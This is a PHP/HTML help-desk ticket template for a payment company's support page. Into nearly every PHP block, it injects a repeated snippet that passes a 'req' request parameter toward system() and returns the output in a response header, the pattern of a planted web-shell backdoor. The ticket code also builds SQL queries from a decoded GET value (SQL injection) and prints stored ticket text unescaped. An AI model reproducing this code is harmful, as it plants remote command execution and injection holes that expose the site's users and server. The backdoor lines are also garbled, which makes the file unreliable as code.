<?=$this->load->view(branded_view('common/header'));?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('helpdesk-admin/config.php');
?>





<style rel="stylesheet">

.navbar-inverse .navbar-nav>li>a {
  color: #fff;
  font-weight: 600!important;
  font-size: 14px;
  text-transform: uppercase;
  text-decoration: none;
  text-shadow: 0px 0px 1px #000;
}

.banner {
color: #fff;
text-align: center;
padding-top: 0px;
padding-bottom: 1px;
position: relative;
overflow: hidden;
background-color: #000;
background: linear-gradient(180deg,#000 0%,#000 200%);
margin-top: 0px;
margin-bottom: 1px;
}

.banner .container {
position: absolute;
width: 100%;
top: 28%;
}

.banner .carousel-indicators {
bottom: 0%;
}

ol, ul {
padding: 0 0 0 0px!important;
}
    
header.site-header a.login {
color: #FEFEFE;
border: 1px solid #f1f1f1;
border-radius: 100px;
margin-left: 10px;
text-transform: uppercase;
letter-spacing: 1px;
font-weight: 200;
/* padding: 0; */
line-height: 35px;
display: inline-block;
padding: 12px;
margin-top: -4px;
font-size: 14px;
}
    
header.site-header nav {
background: none;
border: 0;
margin: 0;
background-color: #fff;
}
    
header.site-header .navbar-brand a {
background: url("https://db.tt/JJyPoUJX") center left no-repeat!important;
width: 150px;
height: 46px;
display: block;
margin-top: 12px;
background-size: 80%!important;
}

blockquote {
padding: 0;
margin: 0;
border: 0;
font-size: 1.1rem!important;
border-left: 5px solid #eee;
      text-align: center!important;
}

blockquote img {
height: 40px;
border-radius: 100px;
margin-right: 10px;
}
   
blockquote p {
display: inline-block;
margin: 0;
padding: 0;
      font-size: 1.1rem;
      line-height: 1.8;
}
    
    
.quotes-line {
background: #f6f6f6;
padding: 30px 15px;
color: #8f9496;
font-style: italic;
}


.banner h1 {
color: #fff;
font-size: 4.5rem;
font-weight: 300;
margin-bottom: 0;
margin: 0px auto!important;
text-shadow: 1px 1px 1px #555;
}

.col-copy h3 {
color: #fff;
font-weight: 300!important;
opacity: .6;
font-size: 1.9rem;
margin-top: 0;
margin-bottom: 30px;
text-shadow: 1px 1px 1px #555;
}

section.section {
margin-bottom: 0px;
}

.active-section {
top: 0px;
margin-bottom: -2px;
}

.section {
padding: 20px 0!important;
}

#slider {
background-color: #ecf0f1;
height: 260px;
}

.opt-container {
text-align: center;
height: 320px;
}

.opt-container h1 {
font-size: 40px;
color: #fff;
font-weight: bold;
margin: 40px 0 0 0;
padding-top: 20px;
}

.opt-container h2 {
font-size: 22px;
color: #fff;
margin: 10px 0 10px 0;
}


#contactform{
margin-top:-20px;
}


.col-md-3 {
border-right: 0px solid #f1f1f1!important;
padding-top: 30px;
padding-bottom: 0;
width: 25%;
overflow: hidden;
vertical-align: top;
height: 100%;
min-height: 80px!important;
}

.carousel-inner blockquote {
border: none;
text-align: center;
padding: 2px 5%!important;
}

#features {
background-color: #FFF;
padding-top: 40pximportant;
padding-bottom: 40pximportant;
	height:100%;
min-height: 100%!important;
}

.input-lg, .form-horizontal .form-group-lg .form-control {
height: 50px;
padding: 10px 16px;
font-size: 18px;
line-height: 1.33;
border-radius: 6px;
}

.navbar-default .navbar-nav>.active>a, .navbar-default .navbar-nav>.active>a:hover, .navbar-default .navbar-nav>.active>a:focus {
color: #3498db!important;
background-color: #FFF!important;
}

.banner {
position: relative;
text-align: center;
color: #fff;
min-height: 400px!important;
background: #000;
}

.bs-docs-header {
padding-top: 60px;
padding-bottom: 60px;
font-size: 24px;
text-align: left;
margin-bottom: 10px;
height: 340px;
}

.bs-docs-masthead, .bs-docs-header {
position: relative;
padding: 30px 15px;
color: #cdbfe3;
text-align: center;
text-shadow: 0 1px 0 rgba(0,0,0,.1);
background-color: #6f5499;
background-image: -webkit-gradient(linear,left top,left bottom,from(#563d7c),to(#6f5499));
background-image: -webkit-linear-gradient(top,#563d7c 0,#6f5499 100%);
background-image: -o-linear-gradient(top,#563d7c 0,#6f5499 100%);
background-image: linear-gradient(to bottom,#563d7c 0,#6f5499 100%);
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#563d7c', endColorstr='#6F5499', GradientType=0);
background-repeat: repeat-x;
}

.login-footer {
background-color: ;
padding-top: 2px;
}

.login-title {
font-size: 48px;
font-weight: 400;
margin-bottom: 10px;
color: #fff!important;
}

.text-center {
text-align: center;
}

.icon-login {
position: absolute;
}

.login-bottom-text {
padding-left: 90px;
padding-top: 10px;
min-height: 100px;
color: #fff;
}

.fa-5x {
font-size: 7em;
}

.banner i {
font-size: 82px!important;
-webkit-animation: icon_banner 1s;
position: relative;
}

.banner a {
color: #fff;
font-weight: bold;
}

#call-to-action-footer {
padding-top: 40px!important;
padding-bottom: 60px!important;
}


.navbar-nav>li>a .login{
  color: #9585bf!important;
  font-weight: 600;
  font-size: 13px;
  text-transform: uppercase;
  font-family: 'Open Sans', sans-serif;
}
.navbar-nav>li>a .signup {
  color: #009DDC!important;
  font-weight: 600;
  font-size: 13px;
  text-transform: uppercase;
  font-family: 'Open Sans', sans-serif;
}
.navbar-brand img {
  width: 80px;
  height: auto;
  margin-top: -5px;
}


.navbar-inverse {
color: #05101b;
}

.shop-services {
  padding-top: 40px;
  padding-bottom: 50px;
  background-color: #333;
  box-shadow: 0px 1px 4px rgba(0,0,0,0.4);
}

.footer-btm {
  margin-top: 5px;
  padding: 20px;
  background-color: transparent!important;
  border-top-left-radius: 6px;
  border-top-right-radius: 6px;
  color: #ffffff;
}

</style>



<script src="//ssl.google-analytics.com/ga.js"></script><script type="text/javascript" async="" src="https://cdn.segment.com/analytics.js/v1/My7hEmjUg4BKAInGM7QVPGN0Wrv4NX9G/analytics.min.js"></script><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="text/javascript" id="www-widgetapi-script" src="https://s.ytimg.com/yts/jsbin/www-widgetapi-vflLNvjRY/www-widgetapi.js" async=""></script>
	<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->

		<!--[if lte IE 8]>
		<script type="text/javascript" src="https://everpayinc.com/assets/app/js/excanvas.min.js"></script>
		<![endif]-->

	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

<script src="//load.sumome.com/" data-sumo-site-id="9e9919ac356850688e528923a1ed1cb688fd74023742c504f00c50147c5b8757" async="async"></script>

	
  <script src="/google_analytics_auto.js"></script>
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="8dc42610-ae42-4164-90b1-573478b46574/service" src="//sumome-140a.kxcdn.com/virtual/1fe2057c959e752455113083603f406a353b850c/client/js/8dc42610-ae42-4164-90b1-573478b46574/service.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="13359558-e447-43f3-a3cd-aa61c0b91c02/service" src="//sumome-140a.kxcdn.com/virtual/5a3be5a2ed89ee2212cf1f55733c287fc9adfbe0/client/js/13359558-e447-43f3-a3cd-aa61c0b91c02/service.js"></script><link type="text/css" rel="stylesheet" href="//sumome-140a.kxcdn.com/virtual/ebf93592c0e80c06a16cbb032d576580392d7beb/client/js/../css/sme-popup.css"><link type="text/css" rel="stylesheet" href="//sumome-140a.kxcdn.com/virtual/1a7ca5894ec2b09e6afe3fbc81fa103445b211d9/client/js/../css/sumome-scrollbox-popup.css"></head>


<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $helpdesk_company_name; ?>'s | Help & Support</title>

<style rel="stylesheet">

.banner {
color: #fff;
text-align: center;
padding-top: 0px;
padding-bottom: 1px;
margin-bottom: 1px;
position: relative;
overflow: hidden;
background-color: #000;
background: linear-gradient(180deg,#000 0%,#000 200%);
padding: 0px;
margin-top: -30px;
}

.banner .container {
position: absolute;
width: 100%;
top: 28%;
}

.banner .carousel-indicators {
bottom: 0%;
}

ol, ul {
padding: 0 0 0 0px!important;
}
    
header.site-header a.login {
color: #FEFEFE;
border: 1px solid #f1f1f1;
border-radius: 100px;
margin-left: 10px;
text-transform: uppercase;
letter-spacing: 1px;
font-weight: 200;
line-height: 38px;
display: inline-block;
padding: 10px;
margin-top: -0px;
font-size: 12px!important;
}
    
header.site-header nav {
background: none;
border: 0;
margin: 0;
background-color: #fff;
}
    
header.site-header .navbar-brand a {
background: url("https://db.tt/JJyPoUJX") center left no-repeat!important;
width: 150px;
height: 46px;
display: block;
margin-top: 12px;
background-size: 80%!important;
}

blockquote {
padding: 0;
margin: 0;
border: 0;
font-size: 1.1rem!important;
border-left: 5px solid #eee;
      text-align: center!important;
}

blockquote img {
height: 40px;
border-radius: 100px;
margin-right: 10px;
}
   
blockquote p {
display: inline-block;
margin: 0;
padding: 0;
      font-size: 1.1rem;
      line-height: 1.8;
}
    
    
.quotes-line {
background: #f6f6f6;
padding: 30px 15px;
color: #8f9496;
font-style: italic;
}


.banner h1 {
color: #fff;
font-size: 4.5rem;
font-weight: 300;
margin-bottom: 0;
margin: 0px auto!important;
text-shadow: 1px 1px 1px #555;
}

.col-copy h3 {
color: #fff;
font-weight: 300!important;
opacity: .6;
font-size: 1.9rem;
margin-top: 0;
margin-bottom: 30px;
text-shadow: 1px 1px 1px #555;
}

section.section {
margin-bottom: 40px;
}

.active-section {
top: 0px;
margin-bottom: -20px;
}

.section {
padding: 20px 0!important;
}

#slider {
background-color: #ecf0f1;
height: 230px;
}

.opt-container {
text-align: center;
height: 320px;
}

.opt-container h1 {
font-size: 40px;
color: #fff;
font-weight: bold;
margin: 40px 0 0 0;
padding-top: 20px;
}

.opt-container h2 {
font-size: 22px;
color: #fff;
margin: 10px 0 10px 0;
}


#contactform{
margin-top:-20px;
}


.col-md-3 {
border-right: 0px solid #f1f1f1!important;
padding-top: 30px;
padding-bottom: 0;
width: 25%;
overflow: hidden;
vertical-align: top;
height: 100%;
min-height: 80px!important;
}

.carousel-inner blockquote {
border: none;
text-align: center;
padding: 2px 5%!important;
}

#features {
background-color: #FFF;
height: 680px!important;
}

.input-lg, .form-horizontal .form-group-lg .form-control {
height: 50px;
padding: 10px 16px;
font-size: 18px;
line-height: 1.33;
border-radius: 6px;
}

.navbar-default .navbar-nav>.active>a, .navbar-default .navbar-nav>.active>a:hover, .navbar-default .navbar-nav>.active>a:focus {
color: #3498db!important;
background-color: #FFF!important;
}


	.head {
		text-shadow: 0px 1px #5b751b;
		font-size: 25px;
		background-color: #98c22b;
		color: white;
	}

	body {
		font-family: Helvetica, Verdana, Arial, sans-serif;
	}

	.content {
		padding: 10px;
		font-size: 12px;
		color: #2f2f2f;
		background-color: #e6e6e6;
	}

	.copyright {
		font-size: 11px;
		color: #404040;
	}

	.error {
		color: #990000;
		border-color: #ff534e;
		border-style: solid;
		border-width: 1px;
		margin-bottom: 10px;
		background-color: #ffd6d6;
		padding: 10px;
	}

	.heading {
		margin-bottom: 10px;
		border-bottom-color: #aeaeae;
		border-bottom-style: solid;
		border-bottom-width: 1px;
		padding-bottom: 2px;
		padding-left: 10px;
		font-size: 18px;
	}

	a.tlink:link {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:active {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:visited {
		text-decoration: none;
		color: #484848;
	}

	a.tlink:hover {
		text-decoration: underline;
		color: #484848;
	}

	.text {
		padding: 5px;
	}

	.ticket {
		padding: 5px;
		border-color: #909090;
		border-style: solid;
		border-width: 1px;
		color: #484848;
		background-color: #fafafa;
		margin-bottom: 10px;
	}

	.you {
		border-color: #7a7a7a;
		border-style: solid;
		border-width: 1px;
		background-color: #f4f4f4;
		color: #6a6a6a;
		padding: 10px;
		margin-bottom: 10px;
		margin-top: 10px;
	}

	.admin {
		border-color: #98c22b;
		border-style: solid;
		border-width: 1px;
		background-color: #f3ffe1;
		color: #506717;
		padding: 10px;
		margin-bottom: 10px;
		margin-top: 10px;
	}

.help-support-page {
color: rgba(0,0,0,0.5);
}

.help-support-page .support-items {
background: #f9f9f9;
text-align: center;
border-top: 1px solid #fff;
border-bottom: 1px solid #fff;
}

.help-support-page .banner .search {
margin-top: 30px;
position: relative;
display: inline-block;
}


.help-support-page .banner {
background-image: url("https://db.tt/YwyuHB6Z");
width: 100%;
}


.help-support-page .banner .search:before {
content: "\e18b";
font-family: "budicon-font"!important;
font-style: normal!important;
font-weight: normal!important;
font-variant: normal!important;
text-transform: none!important;
speak: none;
line-height: 1;
-webkit-font-smoothing: antialiased;
-moz-osx-font-smoothing: grayscale;
position: absolute;
width: 20px;
height: 20px;
top: 24px;
left: 24px;
font-size: 20px;
color: #2b2f3e;
}

input[type=search] {
-webkit-appearance: none;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
}

.help-support-page .banner input {
border: 0;
border-radius: 100px;
padding: 12px 30px 12px 40px;
width: 360px;
color: #16214d;
margin: 0;
font-size: 20px;
height: 66px;
text-align: center;
border: 4px solid #6e8086;
}


.help-support-page .support-items .col-md-4 {
border-left: 1px solid #f1f1f1;
padding-top: 20px;
padding-bottom: 20px;
}

.help-support-page .block-links a {
font-weight: bold;
}

.help-support-page .support-items .col-md-4 .illustration:hover {
background-color: #27bef2;
}

.help-support-page .support-items .col-md-4 h4 {
font-weight: 300;
text-transform: uppercase;
margin-top: 30px;
margin-bottom: 0;
}

.help-support-page .support-items .col-md-4 .illustration.i-2 {
background-image: url("https://db.tt/124hLncM");
}

.help-support-page .support-items .col-md-4 .illustration.i-2 {
background-image: url("https://db.tt/19w0lcAr");
}

.help-support-page .support-items .col-md-4 .illustration.i-3 {
background-image: url("https://db.tt/Aqmg3GXy");
}

.help-support-page .support-items .col-md-4 .illustration {
height: 160px;
background: #d0d2d3;
border-bottom: 1px solid #d0d2d3;
background-size: 80%;
background-position: center 20px;
background-repeat: no-repeat;
border-radius: 3px;
margin-top: 20px;
display: block;
-webkit-transition: .5s ease all;
}

.help-support-page .bg-green {
background: #7ed321;
text-transform: uppercase;
color: #fff;
font-weight: bold;
padding: 14px;
font-size: 12px;
letter-spacing: 1px;
text-align: center;
margin-bottom: 20px;
}

.help-support-page .support-icon {
font-size: 40px;
color: #738696;
opacity: .5;
font-weight: 100;
top: -4px;
position: relative;
}


.help-support-page .block-links p {
font-size: 1rem;
}

.modal-dialog {
-o-transform: translate3d(0,0,0);
transform: translate3d(0,0,0);
z-index: inherit;
}

	</style>

  </head>

  <body>

    <!-- HEADER -->
<header class="site-header">
 <nav role="navigation" class="navbar navbar-default navbar-fixed-top page-header">
   <div class="container" style="margin-top:10px;">
     <div class="navbar-header">
 <button type="button" data-toggle="collapse" data-target="#navbar-collapse" class="navbar-toggle">
   <span class="sr-only">Toggle navigation</span>
   <span class="icon-bar"></span>
   <span class="icon-bar"></span>
   <span class="icon-bar"></span>
       </button>
       <h1 class="navbar-brand">
         <a href="//everpayinc.com"></a>
       </h1>
     </div>
     
 <div id="navbar-collapse" class="collapse navbar-collapse">
   <ul class="nav navbar-nav navbar-left">

	         <li>
	        <a href="//everpayinc.com/features/"><i class="fa fa-bars"></i> FEATURES</a>
	         </li>
	        <li>
	       <a href="//everpay.3scale.net/"><i class="fa fa-download"></i> DEVELOPERS</a>
	        </li>
                 <li>
	          <a href="//everpayinc.com/enterprise-solutions/"><i class="fa fa-building"></i> ENTERPRISE </a>
	        </li>
                <li>
	          <a href="//everpayinc.com/blog/"><i class="fa fa-rss"></i> BLOG </a>
	        </li>

	        <li>
	       <a href="//everpayinc.com/contact/"><i class="fa fa-user"></i> CONTACT</a>
	        </li>

	        <li>
	          <a href="//everpayinc.com/signup/"><i class="fa fa-edit"></i> SIGN UP</a>
	        </li>  
   </ul>
   <ul class="nav navbar-nav navbar-right">
<li style="top: 5px;"><a href="//everpayinc.com/apps/dashboard/login" class="login btn btn-primary btn-sm signin-button">Login</a></li>
   </ul>
     </div>
   </div>
   </nav>
 </header>
    
<div class="site-content">
<div class="help-support-page js-search-container first-time">
<div class="banner">
<div class="container">
<i class="icon-budicon-787 icon-banner"></i>
<h1> Help &amp; Support</h1>
<p>Need help getting started? Stuck? Want to learn more?</p>
<form>
<div class="search">
<input type="search" placeholder="How can we help you?" class="js-search-input">
</div>
</form>
</div>
</div>

<div class="container">
<div class="row">
<div class="col-md-12">
<div class="search-results js-search-results" style="display: block;"></div>
</div>
</div>
</div>

<div class="block-links">
<div class="support-items">

<div class="container">

<div class="row">

<div class="col-md-4">
<a href="https://everpayinc.com/docs" class="illustration i-1"></a>
<h4>Tutorial Navigator</h4>
<p>Check the SDKs, samples, and tutorials for your favorite apps - mobile, web, native, and APIs.</p>
<p><a href="https://everpayinc.com/docs">View More</a></p>
</div>

<div class="col-md-4">
<a href="https://everpayinc.com/docs/api" class="illustration i-2"></a>
<h4>DOCUMENTATION &amp; API</h4><p>Learn about our features <br>and common scenarios.</p><p><a href="https://everpayinc.com/docs/">View More</a></p>
</div>

<div class="col-md-4"><a href="https://ask.everpayinc.com" class="illustration i-3"></a>
<h4>COMMUNITY</h4>
<p>Post, discuss, ask questions, and be part <br>of our awesome community.</p>
<p><a href="https://ask.everpayinc.com">View More</a></p>
</div>

</div>

</div>
</div>
</div>

<div class="bg-green">All systems are up and running</div>


<div class="container support-links" style="height: 420px;">

<div class="row">

<div class="col-xs-1 hidden-sm hidden-xs">
<p class="pull-right"><i class="icon-budicon-796 support-icon"></i></p>
</div>

<div class="col-md-5">
<h4>Chat with us</h4>
<p>Got any technical questions? Our developers hang out in #everpay on freenode.</p>
<p><a href="http://chat.everpayinc.com">Chat Now</a></p>
</div>

<div class="col-xs-1 hidden-sm hidden-xs"><p class="pull-right"><i class="icon-budicon-777 support-icon"></i></p></div>

<div class="col-md-5">
<h4>Contact us by email</h4>
<p>Can't find the answer? We’re here to help. Get in touch and we’ll get back to<em> you in a flash</em>.</p>
<p><a href="mailto:support@everpayinc.com">support@everpayinc.com</a></p>
<p><!-- Button trigger modal -->
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
  Submit A ticket
</button>
</p>
</div>

</div>
</div>


<!-- Modal -->
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Submit Ticket</h4>
      </div>
      <div class="modal-body">

<div class="col-md-12 col-copy">
		<div align="center">
		
			<table width="90%" class="portlet-content">
				<tr>
					<td align="left" valign="top">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$ticket = base64_decode($_GET['t']);
						$t = mysql_query("SELECT * FROM tickets WHERE id = '$ticket'");
						$t = mysql_fetch_array($t);
						
						$getMessages = mysql_query("SELECT * FROM messages WHERE on_ticket = '$ticket' ORDER BY id ASC");
						$getMessage = mysql_query("SELECT * FROM messages WHERE on_ticket = '$ticket' ORDER BY id ASC");
						$message = mysql_fetch_array($getMessage);
					?>
					<div class="heading"><b><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ucwords($t['status']); ?>:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['subject']; ?></div>
					<b>From:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_name']; ?> (<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_email']; ?>)<br />
					<b>Ticket Opened:</b> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['date']; ?><br /><br />
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo nl2br($message['content']); ?><br /><br />
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						$orid = $message['id'];
						if(mysql_num_rows($getMessages) == 1) {
					?>
					<div class="heading">Reply</div>
					<form method="post" action="reply.php"
					<table>
						<tr>
							<td align="left" valign="top">Message:</td>
							<td><textarea name="reply" style="width: 300px; height: 100px;"></textarea></td>
						</tr>
						<tr>
							<td>&nbsp;<input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['id']; ?>" name="ticket_id" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_email']; ?>" name="from" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_name']; ?>" name="fromn" /></td>
							<td><input type="submit" value="Reply!" /></td>
						</tr>
					</table>
					</form>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						} else {
					?>
					<div class="heading">Replies</div>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						while($rep = mysql_fetch_array($getMessages)) {
							if($rep['from_email'] == $admin_email) {
								$style = 'admin';
							} else {
								$style = 'you';
							}
							
							if($rep['id'] != $orid) {
							echo '<div class="'.$style.'"><b>From:</b> '.ucwords($style).'<br />'.nl2br($rep['content']).'</div>';
							}
						}
					?>
					<br />
					<div class="heading">Reply</div>
					<form method="post" action="reply.php"
					<table>
						<tr>
							<td align="left" valign="top">Message:</td>
							<td><textarea name="reply" style="width: 300px; height: 100px;"></textarea></td>
						</tr>
						<tr>
							<td>&nbsp;<input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $t['id']; ?>" name="ticket_id" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_email']; ?>" name="from" /><input type="hidden" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['from_name']; ?>" name="fromn" /></td>
							<td><input type="submit" class="btn btn-success" value="Reply!" /></td>

                                                 <td><input type="button" class="btn btn-danger" data-dismiss="modal" value="Close" /></td>
						</tr>
					</table>
					</form>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						}
					?>
					</td>
				</tr>
			</table>
</div>
</div>

</div>
      <div class="modal-footer">
      </div>
    </div>
  </div>
</div>
			
		</div>
	</div><!-- /.row-->

<!-- Footer================================================== -->

<?=$this->load->view(branded_view('common/footer'));?>